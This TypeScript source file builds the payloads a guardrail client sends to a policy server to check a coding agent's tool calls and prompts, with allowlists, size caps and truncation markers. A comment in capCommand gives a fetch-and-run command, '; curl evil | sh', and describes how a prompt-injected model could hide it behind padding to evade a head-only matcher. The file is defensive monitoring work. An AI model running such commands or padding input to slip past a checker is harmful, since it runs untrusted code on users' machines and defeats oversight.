// The pretool payload builder — a pure function. No fetch, no fs, no logging, and nothing is ever
// written to disk (ASVS V8 / T-08-12).
//
// **What the body carries, exactly:** the verbatim shell command, the cwd, a `metadata.file_path` for
// the native file tools, and an **allowlisted subset** of the model-produced tool input.
//
// **File bodies and edit hunks are never forwarded.** Not capped — absent. `write.content` and
// `edit.edits` are read by nothing server-side: `metadata.tool_input` has three consumers in
// `preToolUseHandler.ts` (`:914` MCP input DLP, which only a resolved MCP call reaches; `:1201` RepoGate;
// `:1594` `buildSyntheticPattern`, which reads `pattern` for grep/find), and paths come from
// `metadata.file_path` (§C4). Sending them was undeclared egress of file contents for zero
// enforcement value (WR-04 / T-09-03) — so if a future reader is tempted to "restore" them as a
// parity fix, the finding to read first is §C4's "nothing reads them".
//
// Three contracts live here:
//
//   * The §B1 field list, exactly. Every Phase-9 / Future field is absent from the code as well as
//     the type — the identity field in particular runs a deny-capable gate server-side.
//   * The path contract carried forward from the Phase-7 review (STATE.md): pi makes `path`
//     OPTIONAL on grep/find/ls (§A2), while the API entry gate requires
//     `!!command || (isValidNativeTool && !!filePath)` (§B3). A pathless search would therefore
//     skip policy evaluation entirely, so those three tools always send `metadata.file_path`,
//     defaulting to cwd.
//   * The allowlist runs BEFORE the existing 16 KB whole-object cap, which stays as defence in
//     depth for the keys that do survive.
//
// `auditToolInput` lives here rather than in `turnLog.ts` for the same reason: the turn log's
// `tool_input` must be the SAME projection this file already sends, so both come out of one allowlist
// and one pair of caps. A key the pretool request does not carry cannot appear in an audit row.
//
// **The one exception: an MCP call** (`PretoolPayloadInput.mcp`). The gateway's MCP path (Path 3)
// evaluates MCP policies and input DLP on the arguments themselves, so for a call the
// pi-mcp-adapter approval broker handed us, `metadata.tool_input` carries the arguments WHOLE up to
// `MAX_MCP_ARGS_BYTES` (512 KiB) and unredacted; past that, the head and tail of their serialisation
// with `metadata.tool_input_truncated: true` (`mcpArgsForWire`) — the middle is not inspected. The
// whole serialised body is then held under `MAX_PRETOOL_BODY_BYTES` (900 KiB, `fitMcpBody`), so the
// 1 MiB ingress limit can never turn a check into a 413 and a fail-open allow. That is a deliberate,
// MCP-only egress widening; every native tool still goes through the allowlist above. The same branch names the call `mcp__<server>__<tool>` with explicit
// `metadata.mcp_server` / `mcp_tool`, so neither the gateway's Path-2 name diversion nor its
// first-`__` split can reinterpret it, and attaches `mcp_server_config` (`url`, or `command` + `args`)
// when the config could be read unambiguously.

import {
  APP_LABEL,
  EVENT_NAME_TOOL_USE,
  EVENT_NAME_USER_PROMPT,
  MAX_COMMAND_CHARS,
  MAX_PROMPT_CHARS,
  MAX_MCP_ARGS_BYTES,
  MAX_PRETOOL_BODY_BYTES,
  MAX_TOOL_INPUT_BYTES,
  MAX_TOOL_INPUT_VALUE_BYTES,
  TOOL_INPUT_ALLOWLIST,
} from "./constants.ts";
import type { AccountIdentity } from "./accountIdentity.ts";
import type {
  PreToolUseData,
  PretoolPayloadInput,
  PretoolRequestBody,
  PromptPayloadInput,
} from "./types.ts";

/** Native search tools whose `path` is optional in pi — `file_path` falls back to cwd. */
export const PATH_DEFAULTING_TOOLS = ["grep", "find", "ls"] as const;
/** Native file tools whose `path` is required by pi's schema. */
export const PATH_REQUIRED_TOOLS = ["read", "write", "edit"] as const;

const PATH_DEFAULTING: ReadonlySet<string> = new Set(PATH_DEFAULTING_TOOLS);
const PATH_REQUIRED: ReadonlySet<string> = new Set(PATH_REQUIRED_TOOLS);

/**
 * The six tools the API evaluates on `metadata.file_path` rather than on a command —
 * `PI_NATIVE_FILE_TOOLS` in `taxonomy.ts:137-144`, and the exact set `computeToolsToCheck`
 * intersects against.
 *
 * Exported so `cache.ts` (RES-03's file-tool skip) imports the list instead of retyping it: a
 * taxonomy change must not be able to drift between the payload builder and the skip decision, and
 * a name in one place but not the other is either a skipped check or a redundant round trip.
 */
export const NATIVE_FILE_TOOLS: ReadonlySet<string> = new Set([
  ...PATH_DEFAULTING_TOOLS,
  ...PATH_REQUIRED_TOOLS,
]);

/**
 * `metadata.file_path` for a tool call, or `undefined` when the tool has no file semantics
 * (`bash`, `powershell`, any custom/MCP tool) — those are evaluated on `command`, or (a resolved
 * MCP call) on the MCP branch of `buildPretoolPayload`.
 */
export function resolveFilePath(
  toolName: string,
  toolInput: Record<string, unknown>,
  cwd: string,
): string | undefined {
  const isDefaulting = PATH_DEFAULTING.has(toolName);
  if (!isDefaulting && !PATH_REQUIRED.has(toolName)) return undefined;

  const path = toolInput.path;
  if (typeof path === "string" && path.length > 0) return path;
  return isDefaulting ? cwd : undefined;
}

const ALLOWED_TOOL_INPUT_KEYS: ReadonlySet<string> = new Set(TOOL_INPUT_ALLOWLIST);

/**
 * Slice a string to at most `maxBytes` UTF-8 bytes **on a code-point boundary**.
 *
 * `value.slice(0, maxBytes)` would cut UTF-16 code units, which splits a surrogate pair at the
 * boundary and turns an emoji into a lone surrogate that serialises as U+FFFD. Iterating code points
 * and stopping before the budget is exceeded keeps the result valid UTF-8, and the loop is bounded by
 * `maxBytes` iterations (not by the input length), because it breaks as soon as the next character
 * would not fit.
 */
function sliceToBytes(value: string, maxBytes: number): string {
  if (Buffer.byteLength(value) <= maxBytes) return value;
  let out = "";
  let usedBytes = 0;
  for (const char of value) {
    const size = Buffer.byteLength(char);
    if (usedBytes + size > maxBytes) break;
    out += char;
    usedBytes += size;
  }
  return out;
}

/**
 * Apply `TOOL_INPUT_ALLOWLIST` (WR-04). Keeps only allowlisted keys whose values are
 * `string | number | boolean`, slices any surviving string to `MAX_TOOL_INPUT_VALUE_BYTES`, and says
 * so:
 *
 *   * `_dropped: true` — at least one key or value was removed, so the server can see the forward was
 *     lossy rather than inferring it from an absence;
 *   * `_truncated: true` — at least one surviving value is a prefix, not the whole value.
 *
 * Neither marker appears when nothing happened, so a clean forward stays byte-diffable. Total: a
 * non-object input is an empty forward, never a throw.
 */
export function sanitizeToolInput(toolInput: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  if (toolInput === null || typeof toolInput !== "object" || Array.isArray(toolInput)) return out;

  let dropped = false;
  let truncated = false;

  for (const [key, value] of Object.entries(toolInput)) {
    if (!ALLOWED_TOOL_INPUT_KEYS.has(key)) {
      dropped = true;
      continue;
    }
    if (typeof value === "number" || typeof value === "boolean") {
      out[key] = value;
      continue;
    }
    if (typeof value !== "string") {
      // An object, array, null or undefined on an allowlisted key. Forwarding it would re-open the
      // egress hole one key at a time, and no evaluator could use it anyway.
      dropped = true;
      continue;
    }
    const sliced = sliceToBytes(value, MAX_TOOL_INPUT_VALUE_BYTES);
    if (sliced.length !== value.length) truncated = true;
    out[key] = sliced;
  }

  if (truncated) out._truncated = true;
  if (dropped) out._dropped = true;
  return out;
}

/**
 * Cap the serialised size of a model-produced tool input (T-08-06). Over the cap, return a stand-in
 * that keeps the scalar keys which still fit, so the server retains some signal. Circular or
 * otherwise unserialisable input degrades to a marker instead of throwing.
 */
export function capToolInput(
  toolInput: Record<string, unknown>,
  maxBytes = MAX_TOOL_INPUT_BYTES,
): Record<string, unknown> {
  let serialised: string;
  try {
    serialised = JSON.stringify(toolInput) ?? "";
  } catch {
    return { _unserializable: true };
  }

  const originalBytes = Buffer.byteLength(serialised);
  if (originalBytes <= maxBytes) return toolInput;

  const capped: Record<string, unknown> = { _truncated: true, _original_bytes: originalBytes };
  let usedBytes = Buffer.byteLength(JSON.stringify(capped));
  for (const [key, value] of Object.entries(toolInput)) {
    if (typeof value !== "string" && typeof value !== "number" && typeof value !== "boolean") continue;
    // +2 for the separating comma and the key/value colon.
    const entryBytes = Buffer.byteLength(JSON.stringify(key)) + Buffer.byteLength(JSON.stringify(value)) + 2;
    if (usedBytes + entryBytes > maxBytes) continue;
    capped[key] = value;
    usedBytes += entryBytes;
  }
  return capped;
}

/** Marker spliced between the head and tail of an over-long command. */
export const COMMAND_TRUNCATION_MARKER = "\n#...unbound: omitted...\n";

/**
 * Cap a command at `maxChars` while keeping **both ends**.
 *
 * Head-only truncation is a padding bypass: a prompt-injected model can put 8 KB of innocuous
 * text first and `; curl evil | sh` last, and the matcher would only ever see the innocuous
 * half while the tool still runs the whole thing. Keeping the tail means a pattern written
 * against the dangerous part still fires.
 *
 * The marker deliberately contains newlines: JS `.` does not match `\n` without the `s` flag, so
 * splicing cannot make an unrelated single-line pattern span the join and block a command that
 * never contained the match.
 */
export function capCommand(
  command: string,
  maxChars = MAX_COMMAND_CHARS,
): { command: string; truncated: boolean } {
  if (command.length <= maxChars) return { command, truncated: false };

  const budget = maxChars - COMMAND_TRUNCATION_MARKER.length;
  // Degenerate cap (only reachable if MAX_COMMAND_CHARS is ever set tiny): fall back to a plain cut.
  if (budget <= 1) return { command: command.slice(0, maxChars), truncated: true };

  const headChars = Math.ceil(budget / 2);
  const tailChars = budget - headChars;
  return {
    command: command.slice(0, headChars) + COMMAND_TRUNCATION_MARKER + command.slice(-tailChars),
    truncated: true,
  };
}

/**
 * The **audit** projection of one tool call's input — what `tool_use[].tool_input` carries in the
 * turn log (RES-04). Pure, like everything else in this file.
 *
 * Built from the same two functions the pretool request is built from, deliberately: the turn log can
 * then never carry a key the enforcement request does not, so there is exactly one allowlist to
 * widen rather than two to keep in step. `content` and `edits` are absent here for the same reason
 * they are absent there, and `sanitizeToolInput`'s 2 KB per-value cap and `capToolInput`'s 16 KB
 * whole-object cap both still apply.
 *
 * `command` is added on top, because it is the one thing the pretool request sends that does NOT ride
 * `metadata.tool_input`: it travels as `pre_tool_use_data.command`, a top-level field, so the
 * allowlist has never had a reason to name it — and a turn log that omitted it described a shell call
 * without saying what the command was. `capCommand` gives it the same both-ends cap and the same
 * spliced marker the wire command gets, so the audit row and the checked command agree about what
 * was long.
 *
 * It is also **deleted before** the allowlist runs rather than dropped by it, and that is what keeps
 * `_dropped` honest: a `bash` call carries `command` and nothing else, and a `_dropped` marker on it
 * would claim a lossy forward for the one key that travels in full, one field over.
 */
export function auditToolInput(
  toolInput: Record<string, unknown>,
  command: string,
): Record<string, unknown> {
  const isObject = toolInput !== null && typeof toolInput === "object" && !Array.isArray(toolInput);
  // A copy: the caller's `event.input` is pi's live object and must not be mutated (§F9).
  const source: Record<string, unknown> = isObject ? { ...toolInput } : {};
  delete source.command;
  const out = sanitizeToolInput(source);
  if (typeof command === "string" && command !== "") out.command = capCommand(command).command;
  return capToolInput(out);
}

const IDENTITY_FIELDS = [
  "user_email",
  "org_id",
  "plan",
  "auth_mode",
  "email_domain",
  "device_serial",
] as const satisfies readonly (keyof AccountIdentity)[];

/**
 * A copy of `identity` holding only the six wire fields, and only where they are non-empty strings —
 * or `undefined` when nothing survives. Every builder attaches identity through this, so a caller that
 * hands over a wider object (or one holding a credential) cannot widen what is sent.
 */
export function sanitizeAccountIdentity(identity: unknown): AccountIdentity | undefined {
  try {
    if (identity === null || typeof identity !== "object" || Array.isArray(identity)) return undefined;
    const source = identity as Record<string, unknown>;
    const out: AccountIdentity = {};
    for (const field of IDENTITY_FIELDS) {
      const value = source[field];
      if (typeof value === "string" && value.trim() !== "") out[field] = value;
    }
    return Object.keys(out).length > 0 ? out : undefined;
  } catch {
    return undefined;
  }
}

/** Set `account_identity` on `body` when there is one; leave the key absent otherwise. */
export function withAccountIdentity<T extends { account_identity?: AccountIdentity }>(
  body: T,
  identity: unknown,
): T {
  const clean = sanitizeAccountIdentity(identity);
  if (clean !== undefined) body.account_identity = clean;
  return body;
}

/** Spliced between the head and tail of an over-1-MiB MCP argument serialisation. */
export const MCP_ARGS_TRUNCATION_MARKER = "\n...unbound: arguments truncated...\n";

/** What `mcpArgsForWire` hands the builder. */
export interface McpArgsForWire {
  toolInput: Record<string, unknown>;
  truncated: boolean;
  /** The full serialised size, when `truncated`. */
  originalBytes?: number;
}

/**
 * The MCP arguments as `metadata.tool_input` — the MCP-only egress widening described in the header.
 *
 * The object itself, whole and unredacted, while its JSON fits `maxBytes` (512 KiB): DLP and arg-based
 * policies must see exactly what the tool receives, nested values and all (CR-04). Past it — and only
 * then — `{_truncated_json}` holding the head and tail of the serialisation, split by bytes within
 * `maxBytes`, and the caller sets `tool_input_truncated`. Nothing
 * is silently dropped from the part that is sent. Total: unserialisable arguments are
 * `{_unserializable: true}`, marked truncated.
 */
export function mcpArgsForWire(args: Record<string, unknown>, maxBytes = MAX_MCP_ARGS_BYTES): McpArgsForWire {
  try {
    if (args === null || typeof args !== "object" || Array.isArray(args)) return { toolInput: {}, truncated: false };
    const serialised = JSON.stringify(args);
    if (typeof serialised !== "string") return { toolInput: { _unserializable: true }, truncated: true };
    const originalBytes = Buffer.byteLength(serialised);
    if (originalBytes <= maxBytes) return { toolInput: args, truncated: false };
    // Split by UTF-8 BYTES, half each side, so the most of the arguments a byte budget allows is
    // inspected whatever the script. A character cut at the boundary decodes as U+FFFD. The second
    // JSON escaping this string gets inside the body is bounded by the caller (`fitMcpBody`).
    const half = Math.max(1, Math.floor((maxBytes - Buffer.byteLength(MCP_ARGS_TRUNCATION_MARKER)) / 2));
    const bytes = Buffer.from(serialised, "utf8");
    const head = bytes.subarray(0, half).toString("utf8");
    const tail = bytes.subarray(bytes.length - half).toString("utf8");
    return {
      toolInput: { _truncated_json: head + MCP_ARGS_TRUNCATION_MARKER + tail },
      truncated: true,
      originalBytes,
    };
  } catch {
    return { toolInput: { _unserializable: true }, truncated: true };
  }
}

/** Set an own, enumerable data property — never the `__proto__` setter (WR-06). */
function defineData(target: Record<string, unknown>, key: string, value: unknown): void {
  Object.defineProperty(target, key, { value, enumerable: true, writable: true, configurable: true });
}

/**
 * The turn record's copy of MCP arguments: capped (it is an audit column, not an enforcement input),
 * owned (a JSON clone, so the record never aliases pi's live input) and `__proto__`-safe.
 *
 * Whole when the JSON fits `MAX_TOOL_INPUT_BYTES`; otherwise `{_truncated, _original_bytes}` plus the
 * top-level scalars that still fit, strings sliced to `MAX_TOOL_INPUT_VALUE_BYTES`. `JSON.parse`
 * creates an own `__proto__` key as data, and every key here is written with `defineProperty`, so a
 * model cannot hide an argument from the audit row by naming it `__proto__` (WR-06). The turn log
 * redacts every string leaf before posting. Total.
 */
export function auditMcpArgs(args: Record<string, unknown>, maxBytes = MAX_TOOL_INPUT_BYTES): Record<string, unknown> {
  try {
    if (args === null || typeof args !== "object" || Array.isArray(args)) return {};
    const serialised = JSON.stringify(args);
    if (typeof serialised !== "string") return { _truncated: true };
    const originalBytes = Buffer.byteLength(serialised);
    if (originalBytes <= maxBytes) {
      const cloned = JSON.parse(serialised) as unknown;
      return cloned !== null && typeof cloned === "object" && !Array.isArray(cloned)
        ? (cloned as Record<string, unknown>)
        : {};
    }
    const capped: Record<string, unknown> = { _truncated: true, _original_bytes: originalBytes };
    let usedBytes = Buffer.byteLength(JSON.stringify(capped));
    for (const key of Object.keys(args)) {
      const raw = args[key];
      if (typeof raw !== "string" && typeof raw !== "number" && typeof raw !== "boolean") continue;
      const value = typeof raw === "string" ? sliceToBytes(raw, MAX_TOOL_INPUT_VALUE_BYTES) : raw;
      // +2 for the separating comma and the key/value colon.
      const entryBytes = Buffer.byteLength(JSON.stringify(key)) + Buffer.byteLength(JSON.stringify(value)) + 2;
      if (usedBytes + entryBytes > maxBytes) continue;
      defineData(capped, key, value);
      usedBytes += entryBytes;
    }
    return capped;
  } catch {
    return { _truncated: true };
  }
}

/** Assemble the §B1 body. Pure: same input, same output, no side effects. */
export function buildPretoolPayload(input: PretoolPayloadInput): PretoolRequestBody {
  const mcp = input.mcp;
  const metadata: Record<string, unknown> = { cwd: input.cwd };
  if (mcp !== undefined) {
    // Path 3 (see the header): explicit server/tool, the capped arguments, and the projected config
    // only when there is one. No `file_path` — an MCP tool has no file semantics here.
    metadata.mcp_server = mcp.server;
    metadata.mcp_tool = mcp.tool;
    const wire = mcpArgsForWire(mcp.args);
    metadata.tool_input = wire.toolInput;
    if (wire.truncated) {
      metadata.tool_input_truncated = true;
      if (wire.originalBytes !== undefined) metadata.tool_input_original_bytes = wire.originalBytes;
    }
    if (mcp.serverConfig !== undefined) metadata.mcp_server_config = mcp.serverConfig;
    if (typeof mcp.origin === "string" && mcp.origin !== "") metadata.mcp_origin = mcp.origin;
  } else {
    // Allowlist first, then the whole-object cap as defence in depth (WR-04).
    metadata.tool_input = capToolInput(sanitizeToolInput(input.toolInput));
    const filePath = resolveFilePath(input.toolName, input.toolInput, input.cwd);
    if (filePath !== undefined) metadata.file_path = filePath;
  }

  // An MCP call carries no command: an empty one keeps it out of the Path-2 command gate.
  const capped = capCommand(mcp === undefined ? input.command : "");
  if (capped.truncated) {
    // The server cannot tell a whole command from a capped one by looking at the string. Say so
    // explicitly, so a future entry gate can choose to ask or deny rather than matching a
    // partial command as if it were the command that will actually run.
    metadata.command_truncated = true;
    metadata.command_original_chars = input.command.length;
  }

  const preToolUseData: PreToolUseData = {
    // Forwarded verbatim: Phase 7 registered the lowercase pi names, so title-casing means the
    // server never matches the tool and enforcement silently disappears. A resolved MCP call is
    // named the way the gateway and the backend parse MCP names, `mcp__<server>__<tool>`.
    tool_name: mcp === undefined ? input.toolName : `mcp__${mcp.server}__${mcp.tool}`,
    command: capped.command,
    metadata,
  };
  if (typeof input.toolUseId === "string" && input.toolUseId.length > 0) {
    preToolUseData.tool_use_id = input.toolUseId;
  }

  const body: PretoolRequestBody = {
    conversation_id: input.sessionId,
    // `model` is required on the wire and `ctx.model` may be undefined (§A4); `'auto'` is the same
    // fallback the Python hook uses.
    model: input.model !== undefined && input.model.length > 0 ? input.model : "auto",
    event_name: EVENT_NAME_TOOL_USE,
    pre_tool_use_data: preToolUseData,
    messages: [{ role: "user", content: input.lastUserPrompt ?? "" }],
    unbound_app_label: APP_LABEL,
    client_entrypoint: input.clientEntrypoint,
  };
  // Set only when true. `pull_policies: false` would say nothing the absence does not already say,
  // and every key that rides a request the caller did not ask for is a key a future reader has to
  // account for.
  if (input.pullPolicies === true) body.pull_policies = true;
  const finished = withAccountIdentity(body, input.accountIdentity);
  if (mcp !== undefined) fitMcpBody(finished, mcp.args);
  return finished;
}

/** `JSON.stringify` byte length, or `Infinity` when it cannot be serialised. */
function serialisedBytes(value: unknown): number {
  try {
    const text = JSON.stringify(value);
    return typeof text === "string" ? Buffer.byteLength(text) : Number.POSITIVE_INFINITY;
  } catch {
    return Number.POSITIVE_INFINITY;
  }
}

/**
 * Keep the whole serialised MCP request under `MAX_PRETOOL_BODY_BYTES` (CR-03).
 *
 * The 512 KiB argument cap alone does not bound the BODY: a truncated `_truncated_json` string is
 * escaped a second time when the body is serialised (a `"` becomes `\"`, a control char six bytes),
 * and the prompt and metadata ride along. An over-limit body reaches the ingress as a 413, which the
 * checker reads as a fail-open allow and a breaker failure. So the final body is measured, and the
 * arguments halved until it fits; if even an empty argument object would not fit, `tool_input` is
 * `{}` — still marked truncated, never silently whole.
 */
function fitMcpBody(body: PretoolRequestBody, args: Record<string, unknown>): void {
  try {
    const metadata = body.pre_tool_use_data.metadata;
    let budget = MAX_MCP_ARGS_BYTES;
    while (serialisedBytes(body) >= MAX_PRETOOL_BODY_BYTES) {
      budget = Math.floor(budget / 2);
      if (budget < 1024) {
        metadata.tool_input = {};
        metadata.tool_input_truncated = true;
        metadata.tool_input_original_bytes = serialisedBytes(args);
        return;
      }
      const wire = mcpArgsForWire(args, budget);
      metadata.tool_input = wire.toolInput;
      metadata.tool_input_truncated = true;
      metadata.tool_input_original_bytes = wire.originalBytes ?? serialisedBytes(args);
    }
  } catch {
    // `mcpArgsForWire` and `serialisedBytes` are total; this is the belt to their braces.
  }
}

/**
 * Assemble the **prompt-check** body (HOOK-05), matching `unbound.py:4685-4713` field for field.
 *
 * Three things about it are easy to get wrong:
 *
 *   * The prompt rides `messages`, not a `user_prompts` field. The server reads it via
 *     `createGuardrailContext(body.messages, …)` + `setLastUserMessageToText` (`:627-628`).
 *   * `pre_tool_use_data` is **required by the type even here**, so it is sent with a blank
 *     `tool_name` and a blank `command`. Those blanks are what keep the request out of the Path-2
 *     command-policy gate, which is correct: a prompt is not a tool call.
 *   * Nothing tool-shaped is attached. No `file_path`, no `tool_input`, and above all no `images` —
 *     see `PromptPayloadInput`.
 *
 * Pure, like `buildPretoolPayload`: same input, same output, nothing written anywhere.
 */
export function buildPromptPayload(input: PromptPayloadInput): PretoolRequestBody {
  // The same both-ends discipline a command gets, for the same padding-bypass reason — see
  // `MAX_PROMPT_CHARS`.
  const capped = capCommand(input.prompt, MAX_PROMPT_CHARS);
  const metadata: Record<string, unknown> = { cwd: input.cwd, has_ui: input.hasUI };
  if (capped.truncated) {
    // Otherwise the server cannot tell a whole prompt from a spliced one, and a guardrail matching
    // across the join would be matching text the user never typed.
    metadata.prompt_truncated = true;
    metadata.prompt_original_chars = input.prompt.length;
  }

  const body: PretoolRequestBody = {
    conversation_id: input.sessionId,
    model: input.model !== undefined && input.model.length > 0 ? input.model : "auto",
    event_name: EVENT_NAME_USER_PROMPT,
    pre_tool_use_data: { tool_name: "", command: "", metadata },
    messages: [{ role: "user", content: capped.command }],
    unbound_app_label: APP_LABEL,
    client_entrypoint: input.clientEntrypoint,
  };
  // Inert on this path — `handleGuardrails` never attaches `tools_to_check` (§C2) — so it is only
  // ever set if a caller explicitly asks, and no caller does today.
  if (input.pullPolicies === true) body.pull_policies = true;
  return withAccountIdentity(body, input.accountIdentity);
}
